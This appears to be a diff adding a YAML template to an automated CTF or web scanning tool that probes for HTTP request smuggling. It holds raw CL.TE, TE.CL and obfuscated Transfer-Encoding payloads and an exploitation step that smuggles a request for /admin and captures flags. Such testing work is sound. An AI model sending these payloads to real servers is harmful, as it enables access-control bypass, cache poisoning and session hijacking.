@@ -1,0 +1,187 @@
+id: web_http_request_smuggling
+name: HTTP Request Smuggling
+category: web
+version: "1.0"
+author: system
+description: >
+  Detects HTTP Request Smuggling vulnerabilities, where a frontend and backend server
+  disagree on HTTP request boundaries, leading to potential cache poisoning,
+  session hijacking, or security bypass.
+
+applies_when:
+  - "context.challenge.type == 'web'"
+
+min_confidence: 0.10
+stop_on_flag: true
+
+confidence_seeds:
+  # HTTP Request Smuggling is generally detected via direct probing,
+  # rather than initial context clues like paths or parameters.
+  # So, no specific seeds here.
+  - if: "true" # Always consider this tree for web challenges
+    boost: 0.05
+    label: "Web challenge type"
+
+detection_paths:
+  - id: cl_te_smuggling_probe
+    name: CL.TE HTTP Smuggling Probe
+    description: >
+      Sends a request with both Content-Length and Transfer-Encoding headers.
+      The frontend processes Content-Length, while the backend processes Transfer-Encoding,
+      leading to a discrepancy and potential request smuggling.
+    min_confidence: 0.10
+    steps:
+      - id: send_cl_te_payload
+        action: http_probe
+        params:
+          method: POST
+          path: '/' # Target any path, often '/' or '/search'
+          headers:
+            Content-Length: '6' # Frontend sees length 6 for first chunk marker payload
+            Transfer-Encoding: 'chunked' # Backend processes chunked
+            Connection: 'keep-alive' # Keep connection open for subsequent smuggled request
+          body: |
+            0
+
+            XPOST /smuggled HTTP/1.1
+            Content-Length: 10
+
+            SMUGGLED
+        signals:
+          - match: 'HTTP/1.1 404 Not Found' # Smuggled request might hit a non-existent path
+            on_match:
+              confidence_boost: 0.35
+              emit: cl_te_smuggling_detected
+          - match: '500 Internal Server Error' # Or other server-side errors
+            on_match:
+              confidence_boost: 0.30
+              emit: cl_te_smuggling_detected
+          - match: 'HTTP/1.1 200 OK' # Smuggled request succeeded
+            on_match:
+              confidence_boost: 0.40
+              emit: cl_te_smuggling_detected
+
+  - id: te_cl_smuggling_probe
+    name: TE.CL HTTP Smuggling Probe
+    description: >
+      Sends a request where the frontend processes Transfer-Encoding and the backend processes Content-Length.
+      The CL value will be short, terminating the frontend's interpretation early.
+    min_confidence: 0.10
+    steps:
+      - id: send_te_cl_payload
+        action: http_probe
+        params:
+          method: POST
+          path: '/'
+          headers:
+            Content-Length: '4' # Backend sees length 4, processes 'ABCD'
+            Transfer-Encoding: 'chunked' # Frontend processes chunked
+            Connection: 'keep-alive'
+          body: |
+            1
+            A
+            0
+
+          # 'A' is the first chunk, then '0' ends the chunked request for frontend.
+        signals:
+          - match: 'HTTP/1.1 400 Bad Request' # Often leads to malformed request on backend
+            on_match:
+              confidence_boost: 0.35
+              emit: te_cl_smuggling_detected
+          - match: '500 Internal Server Error'
+            on_match:
+              confidence_boost: 0.30
+              emit: te_cl_smuggling_detected
+
+  - id: obfuscated_te_smuggling_probe
+    name: Obfuscated Transfer-Encoding Smuggling Probe
+    description: >
+      Attempts to obfuscate the Transfer-Encoding header to trick one server into ignoring it.
+    min_confidence: 0.15
+    steps:
+      - id: send_obfuscated_te_payload
+        action: http_probe
+        params:
+          method: POST
+          path: '/'
+          headers:
+            Content-Length: '4'
+            Transfer-Encoding: 'chunked,' # Obfuscated TE
+            Connection: 'keep-alive'
+          body: |
+            1
+            A
+            0
+
+        signals:
+          - match: 'HTTP/1.1 400 Bad Request'
+            on_match:
+              confidence_boost: 0.30
+              emit: obfuscated_smuggling_detected
+          - match: '500 Internal Server Error'
+            on_match:
+              confidence_boost: 0.25
+              emit: obfuscated_smuggling_detected
+
+exploitation_paths:
+  - id: confirm_smuggling_primitive
+    name: Confirm Smuggling Primitive
+    requires_signal: cl_te_smuggling_detected
+    technique: http_request_smuggling_cl_te
+    description: >
+      A Content-Length/Transfer-Encoding discrepancy was detected, indicating potential for HTTP Request Smuggling.
+      This confirms the primitive for further exploitation.
+    steps:
+      - id: probe_smuggled_request
+        action: http_probe
+        params:
+          method: POST
+          path: '/'
+          headers:
+            Content-Length: '6'
+            Transfer-Encoding: 'chunked'
+            Connection: 'keep-alive'
+          body: |
+            0
+
+            GET /admin HTTP/1.1
+            Host: example.com
+
+          # Smuggle a request for /admin
+        capture:
+          - pattern: '(?s)HTTP/1.1 200 OK.*admin_dashboard' # Look for signs of successful admin access
+            as: smuggled_admin_response
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+          - pattern: 'CTF\{[^}]+\}'
+            as: flag_value
+
+  - id: confirm_smuggling_primitive_te_cl
+    name: Confirm Smuggling Primitive (TE.CL)
+    requires_signal: te_cl_smuggling_detected
+    technique: http_request_smuggling_te_cl
+    description: >
+      A Transfer-Encoding/Content-Length discrepancy was detected, indicating potential for HTTP Request Smuggling.
+    steps:
+      - id: probe_smuggled_request_te_cl
+        action: http_probe
+        params:
+          method: POST
+          path: '/'
+          headers:
+            Content-Length: '4'
+            Transfer-Encoding: 'chunked'
+            Connection: 'keep-alive'
+          body: |
+            1
+            A
+            0
+
+          # This payload itself is the smuggling primitive
+        capture:
+          - pattern: 'HTTP/1.1 400 Bad Request' # Confirm the error response that indicates smuggling
+            as: te_cl_smuggling_confirmed
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+          - pattern: 'CTF\{[^}]+\}'
+            as: flag_value
